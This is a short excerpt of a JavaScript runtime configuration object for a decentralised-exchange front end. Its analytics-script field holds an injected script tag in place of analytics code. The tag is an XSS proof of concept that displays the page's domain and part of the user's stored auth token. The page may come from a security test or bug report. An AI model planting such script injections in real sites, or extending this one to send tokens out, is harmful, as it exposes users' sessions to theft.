window.__RUNTIME_CONFIG__ = {
  ...
  "VITE_SEO_SITE_URL": "https://dex.orderly.network/yagyu-6153/",
  ...
  "VITE_ANALYTICS_SCRIPT": "<script>alert('XSS at '+document.domain+'\\nToken: '+(localStorage.auth_token||'').slice(0,20))</script>",
  "VITE_SYMBOL_LIST": "",
